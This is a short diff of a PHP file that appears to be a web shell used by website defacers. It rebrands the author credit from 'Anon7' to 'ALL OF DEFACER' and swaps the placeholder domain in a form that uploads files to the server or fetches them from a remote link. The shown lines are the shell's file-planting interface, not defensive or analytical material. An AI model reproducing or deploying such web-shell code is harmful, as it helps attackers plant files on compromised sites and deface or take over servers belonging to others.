@@ -105,7 +105,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>Anon7 - 2021</center>";
+	echo "<center><br>ALL OF DEFACER - 2021</center>";
 	exit();
 }
 
@@ -227,7 +227,7 @@ echo '<form enctype="multipart/form-data" method="post">
 <br>
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<input type="text" name="darilink" class="up" placeholder="https://rhysyst9.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
 </form>';
 echo "</table><br>";
 
